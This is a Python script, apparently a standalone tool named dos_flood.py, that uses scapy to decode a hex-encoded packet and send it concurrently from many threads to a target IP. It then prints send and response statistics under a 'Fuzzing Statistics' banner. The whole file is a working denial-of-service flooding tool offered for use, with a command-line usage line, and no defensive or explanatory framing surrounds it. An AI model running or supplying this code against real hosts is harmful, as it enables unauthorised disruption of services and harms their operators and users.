import sys
import binascii
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter
import threading

class DoSFlood:
    def __init__(self, packet_hex, target_ip, target_port, ip_version=4, timeout=5, num_connections=100):
        self.packet_hex = packet_hex
        self.target_ip = target_ip
        self.target_port = target_port
        self.ip_version = ip_version
        self.timeout = timeout
        self.num_connections = num_connections
        self.counters = Counter()
        self.lock = threading.Lock()

        # Convert the hex string back to bytes
        packet_bytes = binascii.unhexlify(packet_hex)

        # Decode the packet
        if ip_version == 6:
            self.packet = IPv6(packet_bytes)
        else:
            self.packet = IP(packet_bytes)

    def send_packet(self):
        try:
            response = sr1(self.packet, timeout=self.timeout, verbose=False)
            with self.lock:
                self.counters['packets_sent'] += 1
            if response:
                with self.lock:
                    self.counters['responses_received'] += 1
                print("Packet sent successfully and response received.")
            else:
                with self.lock:
                    self.counters['timeouts'] += 1
                print("Packet sent but no response received.")
        except Exception as e:
            with self.lock:
                self.counters['errors'] += 1
            print(f"Error sending packet: {e}")

    def dos_flood(self):
        max_workers = min(self.num_connections, 100)  # Limit the maximum number of workers to avoid "Too many open files" error
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self.send_packet) for _ in range(self.num_connections)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error during execution: {e}")
        
        self.print_statistics()

    def print_statistics(self):
        print("====================================")
        print("Fuzzing Statistics")
        print("====================================")
        print(f"Packets sent: {self.counters['packets_sent']}")
        print(f"Responses received: {self.counters['responses_received']}")
        print(f"Timeouts: {self.counters['timeouts']}")
        print(f"Errors: {self.counters['errors']}")
        print("====================================")

if __name__ == "__main__":
    if len(sys.argv) != 7:
        print("Usage: sudo python dos_flood.py <packet_hex> <target_ip> <target_port> <ip_version> <timeout> <num_connections>")
        sys.exit(1)

    packet_hex = sys.argv[1]
    target_ip = sys.argv[2]
    target_port = int(sys.argv[3])
    ip_version = int(sys.argv[4])
    timeout = float(sys.argv[5])
    num_connections = int(sys.argv[6])

    dos_flood_instance = DoSFlood(packet_hex, target_ip, target_port, ip_version, timeout, num_connections)
    dos_flood_instance.dos_flood()
